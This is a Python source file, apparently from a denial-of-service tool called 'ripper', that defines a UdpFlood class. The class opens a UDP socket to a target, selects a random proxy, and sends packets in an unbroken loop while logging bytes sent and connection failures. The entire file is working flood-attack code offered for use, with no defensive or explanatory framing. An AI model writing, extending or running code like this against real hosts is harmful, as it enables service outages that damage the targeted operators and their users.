from contextlib import suppress
from socket import socket
from typing import Tuple, Any

from ripper.attacks import build_ctx_request_http_package
from ripper.context import Context, Errors
from ripper.constants import *


# TODO add support for SOCKS5 proxy if proxy supports associate request
# https://stackoverflow.com/a/47079318/2628125
# https://datatracker.ietf.org/doc/html/rfc1928
# https://blog.birost.com/a?ID=00100-38682fbb-83c3-49d7-8cfc-406b05bf086c
# PySocks has issues with basic implementation
class UdpFlood:
    """UDP Flood method."""
    _sock: socket
    _target: Tuple[str, int]
    _ctx: Context
    _proxy: Any = None

    def __init__(self, target: Tuple[str, int], context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_udp_socket()
        conn.connect(self._target)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as s:
            self._ctx.Statistic.connect.status_success()
            while self.sendto(s):
                continue

    def sendto(self, sock: socket) -> bool:
        request = build_ctx_request_http_package(self._ctx)

        try:
            sent = sock.sendto(request, self._target)
        except socket.gaierror:
            self._ctx.add_error(Errors('Send UDP packet', GETTING_SERVER_IP_ERROR_MSG))
        except Exception as e:
            self._ctx.add_error(Errors('TCP send Err', e))
            self._ctx.sock_manager.close_udp_socket()
        else:
            self._ctx.Statistic.packets.status_sent(sent_bytes=sent)
            self._ctx.remove_error(Errors('TCP send Err', GETTING_SERVER_IP_ERROR_MSG).uuid)
            return True

        self._ctx.Statistic.connect.status_failed()
        return False

